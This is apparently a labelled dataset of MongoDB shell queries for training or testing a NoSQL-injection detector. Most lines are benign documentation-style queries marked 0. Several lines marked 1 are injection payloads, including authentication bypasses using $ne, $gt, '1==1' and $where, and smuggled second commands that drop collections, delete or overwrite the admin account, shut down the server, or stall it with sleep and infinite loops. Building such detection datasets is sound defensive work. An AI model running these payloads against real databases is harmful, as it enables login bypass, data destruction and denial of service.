db.orders.count( { ord_dt: { $gt: new Date('01/01/2012') } } ,{ $maxTimeMS: 1000 })::::0
db.collection.distinct()::::0
db.inventory.distinct( "sizes" )::::0
db.inventory.distinct( "item.sku" )::::0
db.inventory.distinct( "item.sku", { dept: "A" } )::::0
db.myColl.distinct( "category", {}, { collation: { locale: "fr", strength: 1 } } )::::0
db.scores.aggregate( [{$addFields: {totalHomework: { $sum: "$homework" } ,totalQuiz: { $sum: "$quiz" }}}] )::::0
db.scores.aggregate( [{$addFields: {totalHomework: { $sum: "$homework" } ,totalQuiz: { $sum: "$quiz" }}},{$addFields: { totalScore:{ $add: [ "$totalHomework", "$totalQuiz", "$extraCredit" ] } }}] )::::0
db.vehicles.aggregate( [{$addFields: {"specs.fuel_type": "unleaded"}}] )::::0
db.fruit.aggregate( [{$addFields: {_id : "$item",item: "fruit"}}] )::::0
db.artwork.aggregate( [{$bucket: {groupBy: "$price",boundaries: [ 0, 200, 400 ],default: "Other",output: {"count": { $sum: 1 },"titles" : { $push: "$title" }}}}] )::::0
db.artwork.aggregate( [{$facet: {"price": [{$bucket: {groupBy: "$price",boundaries: [ 0, 200, 400 ],default: "Other",output: {"count": { $sum: 1 },"artwork" : { $push: { "title": "$title", "price": "$price" } }}}}],"year": [{$bucket: {groupBy: "$year",boundaries: [ 1890, 1910, 1920, 1940 ],default: "Unknown",output: {"count": { $sum: 1 },"artwork": { $push: { "title": "$title", "year": "$year" } }}}}]}}] )::::0
db.artwork.aggregate( [{$bucketAuto: {groupBy: "$price",buckets: 4}}] )::::0
db.artwork.aggregate( [{$facet: {"price": [{$bucketAuto: {groupBy: "$price",buckets: 4}}],"year": [{$bucketAuto: {groupBy: "$year",buckets: 3,output: {"count": { $sum: 1 },"years": { $push: "$year" }}}}],"area": [{$bucketAuto: {groupBy: {$multiply: [ "$dimensions.height", "$dimensions.width" ]},buckets: 4,output: {"count": { $sum: 1 },"titles": { $push: "$title" }}}}]}}] )::::0
db.matrices.aggregate( [ { $collStats: { latencyStats: { histograms: true } } } ] )::::0
db.matrices.aggregate( [ { $collStats: { count: { } } } ] )::::0
db.scores.aggregate([{$match: {score: {$gt: 80}}},{$count: "passing_scores"}])::::0
db.places.aggregate([{$geoNear: {near: { type: "Point", coordinates: [ -73.99279 , 40.719296 ] },distanceField:"dist.calculated",maxDistance: 2,query: { type: "public" },includeLocs: "dist.location",num: 5,spherical: true}}])::::0
db.places.aggregate([{$geoNear: {near: { type: "Point", coordinates: [ -73.99279 , 40.719296 ] },distanceField: "dist.calculated",minDistance: 2,query: { type: "public" },includeLocs: "dist.location",num: 5,spherical: true}}])::::0
db.employees.aggregate( [{$graphLookup: {from: "employees",startWith: "$reportsTo",connectFromField: "reportsTo",connectToField: "name",as: "reportingHierarchy"}}] )::::0
db.travelers.aggregate( [{$graphLookup: {from: "airports",startWith: "$nearestAirport",connectFromField: "connects",connectToField: "airport",maxDepth: 2,depthField: "numConnections",as: "destinations"}}] )::::0
db.people.aggregate( [{ $match: { "name": "Tanya Jordan" } },{ $graphLookup: {from: "people",startWith: "$friends",connectFromField: "friends",connectToField: "name",as: "golfers",restrictSearchWithMatch: { "hobbies" : "golf" }}},{ $project: {"name": 1,"friends": 1,"connections who play golf": "$golfers.name"}}] )::::0
db.sales.aggregate([{$group : {_id : { month: { $month: "$date" }, day: { $dayOfMonth: "$date" }, year: { $year: "$date" } },totalPrice: { $sum: { $multiply: [ "$price", "$quantity" ] } },averageQuantity: { $avg: "$quantity" },count: { $sum: 1 }}}])::::0
db.sales.aggregate([{$group : {_id : null,totalPrice: { $sum: { $multiply: [ "$price", "$quantity" ] } },averageQuantity: { $avg: "$quantity" },count: { $sum: 1 }}}])::::0
db.sales.aggregate( [ { $group : { _id : "$item" } } ] )::::0
db.books.aggregate([{ $group : { _id : "$author", books: { $push: "$$ROOT" } } }])::::0
db.orders.aggregate( [ { $indexStats: { } } ] )::::0
db.article.aggregate({ $limit : 5 });::::0
db.aggregate( [ { $listLocalSessions: { } } ] )::::0
db.aggregate( [  { $listLocalSessions: { allUsers: true } } ] )::::0
db.aggregate( [ { $listLocalSessions: { users: [ { user: "myAppReader", db: "test" } ] } } ] )::::0
db.system.sessions.aggregate( [  { $listSessions: { allUsers: true } } ] )::::0
db.system.sessions.aggregate( [ { $listSessions: { } } ] )::::0
db.system.sessions.aggregate( [ { $listSessions: { users: [ {user: "myAppReader", db: "test" } ] } } ] )::::0
db.orders.aggregate([{$lookup:{from: "inventory",localField: "item",foreignField: "sku",as: "inventory_docs"}}])::::0
db.orders.aggregate([{$unwind: "$specs"},{$lookup:{from: "inventory",localField: "specs",foreignField: "size",as: "inventory_docs"}},{$match: { "inventory_docs": { $ne: [] } }}])::::0
db.orders.aggregate([{$lookup: {from: "items", localField: "item", foreignField: "item", as: "fromItems"}},{$replaceRoot: { newRoot: { $mergeObjects: [ { $arrayElemAt: [ "$fromItems", 0 ] }, "$$ROOT" ] } }},{ $project: { fromItems: 0 } }])::::0
db.orders.aggregate([{$lookup:{from: "warehouses",let: { order_item: "$item", order_qty: "$ordered" },pipeline: [{ $match:{ $expr:{ $and:[{ $eq: [ "$stock_item",  "$$order_item" ] },{ $gte: [ "$instock", "$$order_qty" ] }]}}},{ $project: { stock_item: 0, _id: 0 } }],as: "stockdata"}}])::::0
db.absences.aggregate([{$lookup:{from: "holidays",pipeline: [{ $match: { year: 2018 } },{ $project: { _id: 0, date: { name: "$name", date: "$date" } } },{ $replaceRoot: { newRoot: "$date" } }],as: "holidays"}}])::::0
db.articles.aggregate([ { $match : { author : "dave" } } ]);::::0
db.articles.aggregate( [{ $match: { $or: [ { score: { $gt: 70, $lt: 90 } }, { views: { $gte: 1000 } } ] } },{ $group: { _id: null, count: { $sum: 1 } } }] );::::0
db.books.aggregate( [{ $group : { _id : "$author", books: { $push: "$title" } } },{ $out : "authors" }] )::::0
db.books.aggregate( [ { $project : { title : 1 , author : 1 } } ] )::::0
db.bookmarks.aggregate( [ { $project: { "author": { "first": 0}, "lastModified" : 0 } } ] )::::0
db.books.aggregate( [{$project: {title: 1,"author.first": 1,"author.last" : 1,"author.middle": {$cond: {if: { $eq: [ "", "$author.middle" ] },then: "$$REMOVE",else: "$author.middle"}}}}] )::::0
db.bookmarks.aggregate( [ { $project: { "stop.title": 1 } } ] )::::0
db.bookmarks.aggregate( [ { $project: { stop: { title: 1 } } } ] )::::0
db.books.aggregate([{$project: {title: 1,isbn: {prefix: { $substr: [ "$isbn", 0, 3 ] },group: { $substr: [ "$isbn", 3, 2 ] },publisher: { $substr: [ "$isbn", 5, 4 ] },title: { $substr: [ "$isbn", 9, 3 ] },checkDigit: { $substr: [ "$isbn", 12, 1] }},lastName: "$author.last",copiesSold: "$copies"}}])::::0
db.collection.aggregate( [ { $project: { myArray: [ "$x", "$y" ] } } ] )::::0
var userAccess = [ "STLW", "G" ];db.forecasts.aggregate([{ $match: { year: 2014 } },{ $redact: {$cond: {if: { $gt: [ { $size: { $setIntersection: [ "$tags", userAccess ] } }, 0 ] },then: "$$DESCEND",else: "$$PRUNE"}}}]);::::0
db.accounts.aggregate([{ $match: { status: "A" } },{$redact: {$cond: {if: { $eq: [ "$level", 5 ] },then: "$$PRUNE",else: "$$DESCEND"}}}]);::::0
db.produce.aggregate( [{$replaceRoot: { newRoot: "$in_stock" }}] )::::0
db.people.aggregate( [{$match: { pets : { $exists: true } }},{$replaceRoot: { newRoot: "$pets" }}] )::::0
db.contacts.aggregate( [{$replaceRoot: {newRoot: {full_name: {$concat : [ "$first_name", " ", "$last_name" ]}}}}] )::::0
db.contacts.aggregate( [{$unwind: "$phones"},{$match: { "phones.cell" : { $exists: true } }},{$replaceRoot: { newRoot: "$phones"}}] )::::0
db.users.aggregate([ { $sample: { size: 3 } } ])::::0
db.article.aggregate({ $skip : 5 });::::0
db.users.aggregate([{ $sort : { age : -1, posts: 1 } }])::::0
db.users.aggregate([{ $match: { $text: { $search: "operating" } } },{ $sort: { score: { $meta: "textScore" }, posts: -1 } }])::::0
db.articles.aggregate([{ $match: { $text: { $search: "saber -claro", $language: "es" } } },{ $group: { _id: null, views: { $sum: "$views" } } }])::::0
db.articles.aggregate([{ $match: { $text: { $search: "cake tea" } } },{ $project: { title: 1, _id: 0, score: { $meta: "textScore" } } },{ $match: { score: { $gt: 1.0 } } }])::::0
db.mobiles.find({$text : {$search : "samsung note edge"}}, {score : {$meta : "textScore" }}).sort({score : {$meta : "textScore" }})::::0
db.exhibits.aggregate( [ { $unwind: "$tags" },  { $sortByCount: "$tags" } ] )::::0
db.inventory.aggregate( [ { $unwind : "$sizes" } ] )::::0
db.inventory.aggregate( [ { $unwind: { path: "$sizes", includeArrayIndex: "arrayIndex" } } ] )::::0
db.inventory.aggregate( [{ $unwind: { path: "$sizes", preserveNullAndEmptyArrays: true } }] )::::0
db.users.find({"username": "admin", "password": {"$gt": ""}})::::1
db.users.find({"username": "admin"});//,"password": {"$gt": ""}})::::1
db.users.find({"username": "admin", "password": "abcd" || 1==1})::::1
db.users.find({"username": "admin" || 1==1, "password": {"$ne": ""}})::::1
db.users.find({"username": "admin"; return true;//, "password": {"$ne": ""}})::::1
db.users.find({"username": "admin"});db.user.insert(["username"=>"user","password"=>"12345678"])//, "password": {"$ne": ""}})::::1
db.users.find({"username": "admin"});db.users.update({username:"admin"},{username:"admin",password:"12345678"},{ upsert: true })//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.deleteOne({username:"admin"})//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.deleteMany({username:"admin"})//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.drop()//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.remove(username:"admin")//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.user.insertOne(["username"=>"user","password"=>"12345678"])//, "password": {"$ne": ""}})::::1
db.users.find({"username": "admin"; return 1;//, "password": {"$ne": ""}})::::1
db.users.find({"username": "admin"; return 1==1;//, "password": {"$ne": ""}})::::1
db.users.find({"username": "admin"});db.users.updateOne({username:"admin"},{$set : {password:"12345678"}},{ upsert: true })//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.updateMany({username:"admin"},{$set : {password:"12345678"}},{ upsert: true })//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.replaceOne({username:"admin"},{username:"admin", password:"12345678"},{ upsert: true })//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.findOneAndDelete({username:"admin"})//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.findOneAndReplace({username:"admin"},{username:"admin", password:"12345678"})//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.findOneAndUpdate({username:"admin"},{username:"admin", password:"12345678"})//", "password": "abcd"})::::1
db.orders.group({key: { ord_dt: 1, 'item.sku': 1 },cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function ( curr, result ) { },initial: { }})::::0
db.orders.group({key: { ord_dt: 1, 'item.sku': 1 },cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function( curr, result ) {result.total += curr.item.qty;},initial: { total : 0 }})::::0
db.orders.group({keyf: function(doc) {return { day_of_week: doc.ord_dt.getDay() };},cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function( curr, result ) {result.total += curr.item.qty;result.count++;},initial: { total : 0, count: 0 },finalize: function(result) {var weekdays = ["Sunday", "Monday", "Tuesday","Wednesday", "Thursday","Friday", "Saturday"];result.day_of_week = weekdays[result.day_of_week];result.avg = Math.round(result.total / result.count);}})::::0
db.orders.group({key: { ord_dt: 1 },cond: { ord_dt: { $lt: new Date( '01/01/2012' ) } },reduce: function ( curr, result ) { },initial: { }})::::0
db.orders.group({key: { ord_dt: 1, 'item.sku': 1 },,reduce: function ( curr, result ) { },initial: { }})::::0
db.orders.group({key: { ord_dt: 1, 'item.sku': 1 },cond: { },reduce: function ( curr, result ) { },initial: { }})::::0
db.orders.group({key: { ord_dt: 1, 'item.sku': 1 },cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function( curr, result ) {result.totalQuantity += curr.item.qty;result.totalPrice += curr.item.qty*curr.item.price;},initial: { totalQuantity : 0, totalPrice : 0  }})::::0
db.orders.group({keyf: function(doc) {return { day_of_week: doc.ord_dt.getDay() };},cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function( curr, result ) {result.total += curr.item.qty;result.count++;},initial: { total : 0, count: 0 }})::::0
db.orders.group({keyf: function(doc) {return { day_of_week: doc.ord_dt.getDay() };},cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function( curr, result ) {result.total += curr.item.qty;result.count++;},initial: { total : 0, count: 0 },finalize: function(result) {result.avg = Math.round(result.total / result.count);}})::::0
db.orders.group({key: { ord_dt: 1, 'item.sku': 1 },cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function ( curr, result ) { },initial: { },collation: { locale: "fr", strength: 1 }})::::0
db.orders.group({key: { ord_dt: 1, 'item.sku': 1 },cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function( curr, result ) {result.total += curr.item.qty;},initial: { total : 0 },collation: { locale: "fr", strength: 1 }})::::0
db.orders.group({keyf: function(doc) {return { day_of_week: doc.ord_dt.getDay() };},cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function( curr, result ) {result.total += curr.item.qty;result.count++;},initial: { total : 0, count: 0 },collation: { locale: "fr", strength: 1 }})::::0
db.collection.bulkWrite( [{ insertOne : { "document" : {username: "user", password: "123456789"} } }] )::::0
db.collection.bulkWrite( [{ updateOne :{"filter" :  { "document" : {username: "user"} ,"update" :  { "document" : {username:"user", password: "123456789"}}}] )::::0
db.collection.bulkWrite( [{ updateOne :{"filter" :  { "document" : {username: "user"} ,"update" :  { "document" : {username:"user", password: "123456789"} ,"upsert" : true}}] )::::0
db.collection.bulkWrite( [{ updateMany :{"filter" :  { "document" : {username: "user"} ,"update" :  { "document" : {username: "user", password: "123456789"}}}] )::::0
db.collection.bulkWrite( [{ updateMany :{"filter" :  { "document" : {username: "user"} ,"update" :  { "document" : {username: "user", password: "123456789"} ,"upsert" : true}}] )::::0
db.collection.bulkWrite( [{ replaceOne:{"filter" :  { "document" : {username: "user"} ,"replacement" :  { "document" : {username: "user", password: "123456789"}}}] )::::0
db.collection.bulkWrite( [{ replaceOne:{"filter" :  { "document" : {username: "user"} ,"replacement" :  { "document" : {username: "user", password: "123456789"} ,"upsert" : true}}] )::::0
db.collection.bulkWrite([{ deleteOne :  { "filter" : {username: "user"} } }] )::::0
db.collection.bulkWrite([{ deleteMany :  { "filter" : {username: "user"} } }] )::::0
try {db.characters.bulkWrite([{ insertOne :{"document" :{"_id" : 4, "char" : "Dithras", "class" : "barbarian", "lvl" : 4}}},{ insertOne :{"document" :{"_id" : 5, "char" : "Taeln", "class" : "fighter", "lvl" : 3}}},{ updateOne :{"filter" : { "char" : "Eldon" },"update" : { $set : { "status" : "Critical Injury" } }}},{ deleteOne :{ "filter" : { "char" : "Brisbane"} }},{ replaceOne :{"filter" : { "char" : "Meldane" },"replacement" : { "char" : "Tanys", "class" : "oracle", "lvl" : 4 }}}]);}catch (e) {print(e);}::::0
try {db.characters.bulkWrite([{ insertOne :{"document" :{"_id" : 4, "char" : "Dithras", "class" : "barbarian", "lvl" : 4}}},{ insertOne :{"document" :{"_id" : 4, "char" : "Taeln", "class" : "fighter", "lvl" : 3}}},{ updateOne :{"filter" : { "char" : "Eldon" },"update" : { $set : { "status" : "Critical Injury" } }}},{ deleteOne :{ "filter" : { "char" : "Brisbane"} }},{ replaceOne :{"filter" : { "char" : "Meldane" },"replacement" : { "char" : "Tanys", "class" : "oracle", "lvl" : 4 }}}],{ ordered : false });}catch (e) {print(e);}::::0
try {db.enemies.bulkWrite([{ updateMany :{"filter" : { "rating" : { $gte : 3} },"update" : { $inc : { "encounter" : 0.1 } }},},{ updateMany :{"filter" : { "rating" : { $lt : 2} },"update" : { $inc : { "encounter" : -0.25 } }},},{ deleteMany : { "filter" : { "encounter" { $lt : 0 } } } },{ insertOne :{"document" :{"_id" :5, "char" : "ogrekin" , "rating" : 2, "encounter" : 0.31}}}],{ writeConcern : { w : "majority", wtimeout : 100 } });}catch (e) {print(e);}::::0
db.stores.find( { $text: { $search: "java coffee shop" } } )::::0
db.stores.find({ $text: { $search: "coffee shop cake" } },{ score: { $meta: "textScore" } }).sort( { score: { $meta: "textScore" } } )::::0
db.articles.aggregate([{ $match: { $text: { $search: "cake tea" } } },{ $sort: { score: { $meta: "textScore" } } },{ $project: { title: 1, _id: 0 } }])::::0
db.articles.aggregate([{ $match: { $text: { $search: "saber -claro", $language: "es" } } },{ $group: { _id: null, views: { $sum: "$views" } } }])::::0
db.users.copyTo("copyUsers")::::0
db.myColl.createIndex( { category: 1 }, { collation: { locale: "fr" } } )::::0
db.myColl.createIndex({ score: 1, price: 1, category: 1 },{ collation: { locale: "fr" } } )::::0
db.collection.createIndex({ category: 1 },{ name: "category_fr", collation: { locale: "fr", strength: 2 } })::::0
try {db.orders.deleteOne( { "_id" : ObjectId("563237a41a4d68582c2509da") } );} catch (e) {print(e);}::::0
try {db.orders.deleteOne({ "_id" : ObjectId("563237a41a4d68582c2509da") },{ w : "majority", wtimeout : 100 });} catch (e) {print (e);}::::0
db.myColl.deleteOne({ category: "cafe", status: "A" },{ collation: { locale: "fr", strength: 1 } })::::0
try {db.orders.deleteMany( { "client" : "Crude Traders Inc." } );} catch (e) {print (e);}::::0
try {db.orders.deleteMany( { "stock" : "Brent Crude Futures", "limit" : { $gt : 48.88 } } );} catch (e) {print (e);}::::0
try {db.orders.deleteMany({ "client" : "Crude Traders Inc." },{ w : "majority", wtimeout : 100 });} catch (e) {print (e);}::::0
db.myColl.deleteMany({ category: "cafe", status: "A" },{ collation: { locale: "fr", strength: 1 } })::::0
db.users.drop()::::0
db.pets.dropIndex( "catIdx" )::::0
db.pets.dropIndex( { "cat" : -1 } )::::0
db.bios.remove( { } )::::0
db.products.remove({ qty: { $gt: 20 } },{ writeConcern: { w: "majority", wtimeout: 5000 } })::::0
db.products.remove( { qty: { $gt: 20 } }, true )::::0
db.products.remove( { qty: { $gt: 20 }, $isolated: 1 } )::::0
db.myColl.remove({ category: "cafe", status: "A" },{ collation: { locale: "fr", strength: 1 } })::::0
db.rrecord.renameCollection("record")::::0
db.rrecord.renameCollection("record", true)::::0
db.collection.totalSize()::::0
db.inventory.find( { qty: { $mod: [ 4, 0 ] } } )::::0
db.users.find( { name: { $in: [ /^acme/i, /^ack/ ] } } )::::0
db.users.find( { name: { $regex: /acme.*corp/i, $nin: [ 'acmeblahcorp' ] } } )::::0
db.users.find( { name: { $regex: /acme.*corp/, $options: 'i', $nin: [ 'acmeblahcorp' ] } } )::::0
db.users.find( { name: { $regex: 'acme.*corp', $options: 'i', $nin: [ 'acmeblahcorp' ] } } )::::0
db.users.find( { name: { $regex: /acme.*corp/, $options: "si" } } )::::0
db.users.find( { name: { $regex: 'acme.*corp', $options: "si" } } )::::0
db.products.find( { sku: { $regex: /789$/ } } )::::0
db.products.find( { sku: { $regex: /^ABC/i } } )::::0
db.products.find( { description: { $regex: /^S/, $options: 'm' } } )::::0
db.products.find( { description: { $regex: /S/ } } )::::0
db.products.find( { description: { $regex: /m.*line/, $options: 'si' } } )::::0
var pattern = "abc #category code\n123 #item number"; db.products.find( { sku: { $regex: pattern, $options: "x" } } )::::0
db.myCollection.find( { $where: "this.credits == this.debits" } );::::0
db.myCollection.find( { $where: "obj.credits == obj.debits" } );::::0
db.myCollection.find( { active: true, $where: "this.credits - this.debits < 0" } );::::0
db.articles.find( { tags: { $all: [ [ "ssl", "security" ] ] } } )::::0
db.articles.find( { $and: [ { tags: [ "ssl", "security" ] } ] } )::::0
db.articles.find( { tags: [ "ssl", "security" ] } )::::0
db.inventory.find( {qty: { $all: [{ "$elemMatch" : { size: "M", num: { $gt: 50} } },{ "$elemMatch" : { num : 100, color: "green" } }] }} )::::0
db.inventory.find( { "qty.num": { $all: [ 50 ] } } )::::0
db.inventory.find( { dim_cm: { $elemMatch: { $gt: 22, $lt: 30 } } } )::::0
db.inventory.find( { "tags": { $size: 3 } } )::::0
db.inventory.find( { "instock": { $elemMatch: { qty: { $gt: 10, $lte: 20 } } } } )::::0
db.scores.find({ results: { $elemMatch: { $gte: 80, $lt: 85 } } })::::0
db.survey.find({ results: { $elemMatch: { product: "xyz", score: { $gte: 8 } } } })::::0
db.survey.find({ results: { $elemMatch: { product: "xyz" } } })::::0
db.collection.save({ _id: 1, a: 54, binaryValueofA: "00110110" })::::0
db.collection.save({ _id: 2, a: 20, binaryValueofA: "00010100" }) ::::0
db.collection.save({ _id: 3, a: 20.0, binaryValueofA: "00010100" })::::0
db.collection.save({ _id: 4, a: BinData(0, "Zg=="), binaryValueofA: "01100110" })::::0
db.collection.find( { a: { $bitsAllClear: [ 1, 5 ] } } )::::0
db.collection.find( { a: { $bitsAllClear: 35 } } )::::0
db.collection.find( { a: { $bitsAllClear: BinData(0, "ID==") } } )::::0
db.collection.find( { a: { $bitsAllSet: [ 1, 5 ] } } )::::0
db.collection.find( { a: { $bitsAllSet: 50 } } )::::0
db.collection.find( { a: { $bitsAllSet: BinData(0, "MC==") } } )::::0
db.collection.find( { a: { $bitsAnyClear: [ 1, 5 ] } } )::::0
db.collection.find( { a: { $bitsAnyClear: 35 } } )::::0
db.collection.find( { a: { $bitsAnyClear: BinData(0, "MC==") } } )::::0
db.collection.find( { a: { $bitsAnySet: [ 1, 5 ] } } )::::0
db.collection.find( { a: { $bitsAnySet: 35 } } )::::0
db.collection.find( { a: { $bitsAnySet: BinData(0, "MC==") } } )::::0
db.records.find({x: { $mod: [ 2, 0 ] },$comment: "Find even values."})::::0
db.records.aggregate( [{ $match: { x: { $gt: 0 }, $comment: "Don't allow negative inputs." } },{ $group : { _id: { $mod: [ "$x", 2 ] }, total: { $sum: "$x" } } }] )::::0
db.students.find( { semester: 1, grades: { $gte: 85 } },{ "grades.$": 1 } )::::0
db.students.find({ "grades.mean": { $gt: 70 } },{ "grades.$": 1 })::::0
db.schools.find( { zipcode: "63109" },{ students: { $elemMatch: { school: 102 } } } )::::0
db.schools.find( { zipcode: "63109" },{ students: { $elemMatch: { school: 102, age: { $gt: 10} } } } )::::0
db.posts.find( {}, { comments: { $slice: 5 } } )::::0
db.posts.find( {}, { comments: { $slice: -5 } } )::::0
db.posts.find( {}, { comments: { $slice: [ 20, 10 ] } } )::::0
db.adminCommand( { "killOp": 1, "op": 724 } )::::0
db.adminCommand({renameCollection: "test.orders",to: "test.orders-2016"})::::0
db.adminCommand({createUser: "bruce",pwd: "bruce123",roles: [{ role: "dbOwner", db: "admin" }]})::::0
db.cloneCollection('mongodb.example.net:27017', 'users.profile',{ 'active' : true } )::::0
db.cloneDatabase("hostname")::::0
db.copyDatabase('records', 'archive_records')::::0
db.copyDatabase("reporting","reporting_copy","example.net","reportUser","abc123","MONGODB-CR")::::0
db.createCollection( "contacts",{validator: { $or:[{ phone: { $type: "string" } },{ email: { $regex: /@mongodb\.com$/ } },{ status: { $in: [ "Unknown", "Incomplete" ] } }]}})::::0
db.createCollection("users",{ storageEngine: { wiredTiger: { configString: "<option>=<setting>" } } })::::0
db.killOp(6)::::0
db.logout()::::0
db.shutdownServer()::::0
db.repairDatabase()::::0
db.runCommand( {aggregate: "articles",pipeline: [{ $project: { tags: 1 } },{ $unwind: "$tags" },{ $group: { _id: "$tags", count: { $sum : 1 } } }],cursor: { }} )::::0
db.location.find( { "town": { "$regex": "(Pine Lumber)","$options": 'i' } } ).maxTimeMS(30)::::0
db.runCommand( { distinct: "collection",key: "city",maxTimeMS: 45 } )::::0
db.currentOp(true)::::0
db.currentOp( { "$all": true } )::::0
db.currentOp({"waitingForLock" : true,$or: [{ "op" : { "$in" : [ "insert", "update", "remove" ] } },{ "query.findandmodify": { $exists: true } }]})::::0
db.currentOp({"active" : true,"numYields" : 0,"waitingForLock" : false})::::0
db.currentOp({"active" : true,"secs_running" : { "$gt" : 3 },"ns" : /^db1\./})::::0
db.currentOp({$or: [{ op: "command", "query.createIndexes": { $exists: true } },{ op: "none", ns: /\.system\.indexes\b/ }]})::::0
db.users.find({"username": "admin"});db.users.save({username:"newUser", password:"12345678"})//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.renameCollection("record")//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.bulkWrite( [{ insertOne : { "document" :{"username":"newUser", "password":"12345678"} } }])//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.bulkWrite( [{ updateOne : { "filter" :{"username":"admin"} , "update" : {"username":"newUser", "password":"12345678"}} }])//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.bulkWrite( [{ updateMany: { "filter" :{"username":"admin"} , "update" : {"username":"newUser", "password":"12345678"}} }])//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.bulkWrite( [{ replaceOne : { "filter" :{"username":"admin"} , "replacement" : {"username":"newUser", "password":"12345678"}} }])//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.bulkWrite( [{ deleteOne : { "filter" :{"username":"admin"} } }])//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.bulkWrite( [{ deleteMany : { "filter" :{"username":"admin"} } }])//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.copyTo(newUser)//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.users.distinct( "username" )//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.cloneCollection('mongodb.example.net:27017', 'users.profile')//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.cloneDatabase("hostname")//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.copyDatabase('records', 'archive_records')//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.createCollection("user")//", "password": "abcd"})::::1
db.users.find({"username": "admin"});db.shutdownServer()//", "password": "abcd"})::::1
db.users.find({"username": "admin", $where: "1==1"})//", "password": "abcd"})::::1
db.users.find({"username": "admin", "password": "abcd", $where: "1==1"})::::1
db.users.find({"username": "admin", $where: function(){return true}})//", "password": "abcd"})::::1
db.users.find({"username": "admin", $where: function(){return 1}})//", "password": "abcd"})::::1
db.users.find({"username": "admin", $where: "this.password != "" "})//", "password": "abcd"})::::1
db.users.find({"username": "admin"});sleep(10000);//", "password": "abcd"})::::1
db.users.find({"username": "admin", "password": "abcd"});sleep(10000);//"})::::1
db.users.find({"username": "admin"}); while(true){};//", "password": "abcd"})::::1
db.users.find({"username": "admin", "password": {$or: [{}, "123456789"]}})::::1
db.users.find({"username": {$or: [{}, "admin"]}, "password": {$or: [{}, "123456789"]}})::::1
db.myCollection.find( { $where: "this.credits == this.debits || 1==1" } );::::1
db.myCollection.find( { $where: "this.credits == this.debits || this.credits != ''" } );::::1
db.collection.find( { $query: { age : 25 } } )::::0
db.documents.find( { "$query": { query: { a: 1 } } } )::::0
db.collection.find( { $query: {age:{ $gt: 12 }}, $orderby: { age : -1 } } )::::0
db.products.update({ _id: 1 },{ $mul: { price: 1.25 } })::::0
db.products.update({ _id: 3 },{ $mul: { price: NumberInt(5) } })::::0
db.students.updateMany( {}, { $rename: { "nmae": "name" } } )::::0
db.students.update( { _id: 1 }, { $rename: { "name.first": "name.fname" } } )::::0
db.products.update({ _id: 1 },  {$set: { item: "apple" },$setOnInsert: { defaultQty: 100 }  },  { upsert: true })::::0
db.users.update({ _id: 1 },{$currentDate: {lastModified: true,"cancellation.date": { $type: "timestamp" }},$set: {        status: "D","cancellation.reason": "user request"}})::::0
db.students.update({ name: "joe" },{ $push: { scores: { $each: [ 90, 92, 85 ] } } })::::0
db.inventory.update({ _id: 2 },{ $addToSet: { tags: { $each: [ "camera", "electronics", "accessories" ] } } } )::::0
db.students.update({ _id: 1 },{$push: {scores: {$each: [ 50, 60, 70 ],$position: 0}}})::::0
db.students.update({ _id: 1 },{$push: {scores: {$each: [ 20, 30 ],$position: 2}}})::::0
db.test.update({ _id: 1 },{ $addToSet: {letters: [ "c", "d" ] } })::::0
db.inventory.update({ _id: 1 },{ $addToSet: { tags: "accessories" } })::::0
db.students.update({ _id: 1 },{$push: {quizzes: {$each: [ { id: 3, score: 8 }, { id: 4, score: 7 },{ id: 5, score: 6 } ],$sort: { score: 1 }}}})::::0
db.students.update(  { _id: 2 },{ $push: { tests: { $each: [ 40, 60 ], $sort: 1 } } })::::0
db.students.update({ _id: 5 },{$push: {quizzes: {$each: [ { wk: 5, score: 8 }, { wk: 6, score: 7}, { wk: 7, score: 6 } ],$sort: { score: -1 },$slice: 3}}})::::0
db.stores.update({ },{ $pull: { fruits: { $in: [ "apples", "oranges" ] }, vegetables: "carrots" } },{ multi: true })::::0
db.survey.update({ },{ $pull: { results: { answers: { $elemMatch: { q: 2, a: { $gte: 8 } } } } } },{ multi: true })::::0
db.students.update( { _id: 1 }, { $pop: { scores: -1 } } )::::0
db.students.update( { _id: 1 }, { $pop: { scores: 1 } } )::::0
db.switches.update({ _id: 1 },{ $bit: { expdata: { and: NumberInt(10) } } })::::0
db.switches.update({ _id: 2 },{ $bit: { expdata: { or: NumberInt(5) } } })::::0
db.switches.update({ _id: 3 },{ $bit: { expdata: { xor: NumberInt(5) } } })::::0
db.foo.update({ status : "A" , $isolated : 1 },{ $inc : { count : 1 } },{ multi: true })::::0
db.accounts.aggregate([{ $match: { status: "A" } },{$redact: {$cond: {if: { $eq: [ "$level", 5 ] },then: "$$PRUNE",          else: "$$DESCEND"}}}]);::::0
db.inventory.aggregate([{$project:{item: 1,qty: 1,cmpTo250: {$cmp: [ "$qty", 250 ] },_id: 0}}])::::0
